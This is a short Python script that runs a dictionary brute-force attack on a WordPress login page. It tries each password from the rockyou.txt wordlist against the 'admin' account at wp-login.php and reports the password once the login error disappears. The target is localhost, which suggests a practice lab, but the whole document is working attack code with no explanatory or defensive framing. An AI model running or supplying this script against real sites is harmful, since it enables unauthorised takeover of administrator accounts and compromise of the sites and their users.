import requests

passfile = "rockyou.txt"

with open(passfile, "r") as f:
    for word in f:
        word = word.strip("\n")
        trying = requests.post("http://localhost/wp-login.php", data={"log":"admin", "pwd":word}) #where log and pwd is the name attribute of html login and password

        if "ERROR" not in trying.text:
            print("Success, the password is: " + word)
            break
        else:
            print("Incorrect password " +word)
